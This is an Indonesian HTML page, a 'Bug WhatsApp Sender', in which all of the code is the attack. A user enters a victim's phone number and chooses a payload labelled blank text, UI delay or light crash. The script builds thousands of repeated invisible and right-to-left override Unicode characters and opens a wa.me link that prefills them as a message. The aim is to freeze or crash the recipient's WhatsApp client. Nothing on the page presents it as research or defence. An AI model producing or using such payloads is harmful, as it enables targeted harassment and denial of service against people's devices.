<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Bug WhatsApp Sender</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 30px;
      background: #1a1a1a;
      color: white;
    }
    input, select, button {
      padding: 10px;
      font-size: 16px;
      width: 300px;
      margin: 10px;
      border-radius: 8px;
      border: none;
    }
    button {
      background-color: #25D366;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>ğŸ› ï¸ Bug WhatsApp Sender</h2>
  <input id="nomor" placeholder="Masukkan nomor (cth: 6281234567890)" /><br>

  <select id="jenis">
    <option value="blank">ğŸ•³ï¸ Blank Text</option>
    <option value="ui">ğŸ¢ UI Delay</option>
    <option value="crash">ğŸ’¥ Crash Ringan</option>
  </select><br>

  <button onclick="kirim()">KIRIM SEKARANG</button>

  <script>
    function getBug(type) {
      let bug1 = "\u2063".repeat(5000);
      let bug2 = "\u200F\u202E\u2063\u3164".repeat(3000);
      let bug3 = "\u202E\u202E\u202E\u202E\u202E".repeat(1000) + "ğŸ”’".repeat(500);
      if (type === "blank") return bug1;
      if (type === "ui") return bug2;
      if (type === "crash") return bug3;
    }

    function kirim() {
      let nomor = document.getElementById("nomor").value;
      let jenis = document.getElementById("jenis").value;
      let bug = encodeURIComponent(getBug(jenis));
      if (!nomor.startsWith("62")) {
        alert("Gunakan format nomor dimulai dengan 62");
        return;
      }
      window.open(`https://wa.me/${nomor}?text=${bug}`, "_blank");
    }
  </script>
</body>
</html>
